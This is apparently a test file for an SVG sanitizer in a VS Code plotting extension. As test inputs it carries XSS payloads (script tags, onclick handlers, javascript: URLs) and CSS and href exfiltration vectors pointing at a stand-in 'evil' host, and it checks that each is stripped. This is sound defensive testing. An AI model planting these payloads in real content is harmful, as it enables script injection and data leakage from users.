// DOMPurify in Node/Bun needs a DOM to operate on. We borrow jsdom from
// editors/vscode/node_modules via the tracked symlink at
// tests/bun/node_modules → ../../editors/vscode/node_modules, then
// stuff its `window` into globalThis BEFORE importing sanitize.ts so
// the `import DOMPurify from 'dompurify'` in sanitize.ts picks up the
// fake `window` it needs.
import { describe, test, expect, beforeAll } from 'bun:test';
import { JSDOM } from 'jsdom';

beforeAll(() => {
    // Provide a DOM globally so DOMPurify's auto-detection works.
    // DOMPurify uses `window.document.implementation.createHTMLDocument`
    // internally; jsdom gives us all of those for free.
    const dom = new JSDOM('<!doctype html><html><body></body></html>');
    const g = globalThis as Record<string, unknown>;
    g.window = dom.window;
    g.document = dom.window.document;
    g.Node = dom.window.Node;
    g.NodeFilter = dom.window.NodeFilter;
    g.HTMLElement = dom.window.HTMLElement;
    g.SVGElement = dom.window.SVGElement;
    g.DocumentFragment = dom.window.DocumentFragment;
    g.trustedTypes = (dom.window as unknown as { trustedTypes?: unknown }).trustedTypes;
});

// Dynamic import so the beforeAll runs first.
const sanitize_svg: (text: string) => string = await (async () => {
    const mod = await import('../../editors/vscode/src/plot/webview/sanitize');
    return mod.sanitize_svg;
})();

describe('sanitize_svg — benign content passes through', () => {
    test('basic httpgd-style SVG survives', () => {
        const input = '<svg class="httpgd" viewBox="0 0 480 360" xmlns="http://www.w3.org/2000/svg">'
            + '<rect width="100%" height="100%" fill="#ffffff" />'
            + '<text x="10" y="20" fill="#000000">label</text>'
            + '</svg>';
        const out = sanitize_svg(input);
        expect(out).toContain('<svg');
        expect(out).toContain('<rect');
        expect(out).toContain('<text');
        // Body content survives.
        expect(out).toContain('label');
    });

    test('class="httpgd" is preserved (load-bearing for the CSS overlay selector)', () => {
        const input = '<svg class="httpgd" xmlns="http://www.w3.org/2000/svg"><rect /></svg>';
        const out = sanitize_svg(input);
        // Parse the output and verify the root <svg> retains class="httpgd".
        const dom = new JSDOM(`<!doctype html><html><body>${out}</body></html>`);
        const svg = dom.window.document.querySelector('svg');
        expect(svg).not.toBeNull();
        expect(svg!.classList.contains('httpgd')).toBe(true);
    });

    test('viewBox is preserved', () => {
        const input = '<svg class="httpgd" viewBox="0 0 480 360" xmlns="http://www.w3.org/2000/svg"><rect /></svg>';
        const out = sanitize_svg(input);
        const dom = new JSDOM(`<!doctype html><html><body>${out}</body></html>`);
        const svg = dom.window.document.querySelector('svg');
        expect(svg!.getAttribute('viewBox')).toBe('0 0 480 360');
    });

    test('inline fill / stroke attributes survive', () => {
        const input = '<svg xmlns="http://www.w3.org/2000/svg">'
            + '<rect fill="#ffffff" stroke="#000000" />'
            + '</svg>';
        const out = sanitize_svg(input);
        expect(out).toContain('fill="#ffffff"');
        expect(out).toContain('stroke="#000000"');
    });
});

describe('sanitize_svg — malicious content is stripped', () => {
    test('<script> is stripped', () => {
        const input = '<svg><script>alert(1)</script><rect /></svg>';
        const out = sanitize_svg(input);
        expect(out).not.toContain('<script');
        expect(out).not.toContain('alert(1)');
    });

    test('event handler attributes are stripped (e.g. onclick)', () => {
        const input = '<svg><rect onclick="alert(1)" /></svg>';
        const out = sanitize_svg(input);
        expect(out.toLowerCase()).not.toContain('onclick');
        expect(out).not.toContain('alert(1)');
    });

    test('inline style="" attribute is stripped (FORBID_ATTR)', () => {
        // The load-bearing defense behind `style-src \'unsafe-inline\'`:
        // a malicious inline style could exfiltrate via
        // `background:url(//evil/?cookie)`.
        const input = '<svg><rect style="background:url(//evil/?leak)" /></svg>';
        const out = sanitize_svg(input);
        expect(out.toLowerCase()).not.toContain('style=');
        expect(out).not.toContain('evil');
    });

    test('<a xlink:href="javascript:..."> is stripped (FORBID_TAGS: a)', () => {
        const input = '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>';
        const out = sanitize_svg(input);
        expect(out).not.toContain('<a');
        expect(out.toLowerCase()).not.toContain('javascript:');
        // The inner <text> may or may not survive (DOMPurify hoists
        // children when a parent is forbidden), but the <a> wrapper
        // and any javascript: URL MUST be gone.
    });

    test('<use href="//evil/track"> is stripped (FORBID_TAGS: use)', () => {
        const input = '<svg><use href="//evil/track" /><rect /></svg>';
        const out = sanitize_svg(input);
        expect(out).not.toContain('<use');
        expect(out).not.toContain('evil');
    });

    test('<image href="//evil/track"> is stripped (FORBID_TAGS: image)', () => {
        const input = '<svg><image href="//evil/track" /><rect /></svg>';
        const out = sanitize_svg(input);
        expect(out).not.toContain('<image');
        expect(out).not.toContain('evil');
    });

    test('<style>@import url(//evil)</style> is stripped (FORBID_TAGS: style)', () => {
        // Sister channel to inline `style=` attribute exfil.
        const input = '<svg><style>@import url(//evil/?leak)</style><rect /></svg>';
        const out = sanitize_svg(input);
        expect(out).not.toContain('<style');
        expect(out).not.toContain('@import');
        expect(out).not.toContain('evil');
    });

    test('<foreignObject> is stripped (FORBID_TAGS: foreignObject)', () => {
        const input = '<svg><foreignObject><div onclick="alert(1)">html</div></foreignObject><rect /></svg>';
        const out = sanitize_svg(input);
        expect(out.toLowerCase()).not.toContain('foreignobject');
        // Inner HTML should also be sanitized (no onclick).
        expect(out.toLowerCase()).not.toContain('onclick');
    });

    test('<feImage> in filters is stripped (FORBID_TAGS: feImage)', () => {
        const input = '<svg><filter><feImage href="//evil/track" /></filter><rect /></svg>';
        const out = sanitize_svg(input);
        // DOMPurify lowercases element names. Check for both shapes.
        expect(out.toLowerCase()).not.toContain('feimage');
        expect(out).not.toContain('evil');
    });
});

describe('sanitize_svg — robustness', () => {
    test('empty input → empty output', () => {
        expect(sanitize_svg('')).toBe('');
    });

    test('malformed input does not throw', () => {
        expect(() => sanitize_svg('<svg><rect <<<malformed')).not.toThrow();
        expect(() => sanitize_svg('<<<')).not.toThrow();
        expect(() => sanitize_svg('not html at all')).not.toThrow();
    });

    test('purely textual input is returned as-is (or as empty)', () => {
        const out = sanitize_svg('hello world');
        // DOMPurify may return the text as-is for non-tag content.
        expect(typeof out).toBe('string');
    });
});
